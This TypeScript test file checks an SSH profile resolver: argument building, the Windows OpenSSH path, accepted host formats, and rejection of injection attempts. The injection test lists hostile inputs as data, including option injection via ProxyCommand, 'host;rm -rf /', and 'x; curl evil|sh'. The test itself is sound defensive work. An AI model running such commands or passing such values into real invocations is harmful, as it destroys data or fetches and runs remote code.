import assert from "node:assert/strict";
import path from "node:path";
import test from "node:test";
import { assertSshProfile, resolveSshProfile, type SshProfileRecord } from "../src/ssh-profile.js";

const base: SshProfileRecord = { profileId: "p1", name: "Build box", host: "build.example.com" };

test("a minimal profile resolves to a plain ssh invocation with keepalive and no host-key bypass", () => {
  const resolved = resolveSshProfile(base, "linux");
  assert.equal(resolved.file, "ssh");
  assert.deepEqual(resolved.args, ["-o", "ServerAliveInterval=30", "-o", "ServerAliveCountMax=3", "--", "build.example.com"]);
  assert.equal(resolved.args.some((arg) => /StrictHostKeyChecking|UserKnownHostsFile/i.test(arg)), false);
});

test("full profile maps user, port, key, and a persistent remote tmux session", () => {
  const resolved = resolveSshProfile({ ...base, user: "deploy", port: 2222, identityFile: "/home/me/.ssh/id_ed25519", remoteTmuxSession: "main" }, "linux");
  assert.deepEqual(resolved.args, [
    "-o", "ServerAliveInterval=30", "-o", "ServerAliveCountMax=3",
    "-p", "2222", "-l", "deploy", "-i", "/home/me/.ssh/id_ed25519", "-t",
    "--", "build.example.com", "tmux", "new-session", "-A", "-s", "nexus-main",
  ]);
});

test("windows uses the OS OpenSSH by absolute path", () => {
  assert.equal(resolveSshProfile(base, "win32", { SystemRoot: "D:/Win" }).file, path.join("D:/Win", "System32", "OpenSSH", "ssh.exe"));
});

test("option and command injection through any field is rejected", () => {
  const bad: Array<Partial<SshProfileRecord>> = [
    { host: "-oProxyCommand=calc" },
    { host: "host;rm -rf /" },
    { host: "host name" },
    { host: "" },
    { user: "-oProxyCommand=x" },
    { user: "a b" },
    { user: "root@evil" },
    { port: 0 },
    { port: 70_000 },
    { port: 22.5 },
    { identityFile: "relative/key" },
    { remoteTmuxSession: "x; curl evil|sh" },
    { remoteTmuxSession: "-bad" },
    { remoteTmuxSession: "a b" },
  ];
  for (const override of bad) assert.throws(() => resolveSshProfile({ ...base, ...override } as SshProfileRecord, "linux"), /invalid/, JSON.stringify(override));
  assert.throws(() => assertSshProfile(null), /object/);
  assert.throws(() => assertSshProfile({ ...base, profileId: "../x" }), /profileId/);
  assert.throws(() => assertSshProfile({ ...base, name: "  " }), /name/);
});

test("host aliases, IPv4 and IPv6 literals are accepted", () => {
  for (const host of ["myalias", "my_alias", "10.0.0.5", "fe80::1", "a.b-c.example.org"]) {
    assert.doesNotThrow(() => resolveSshProfile({ ...base, host }, "linux"), host);
  }
});
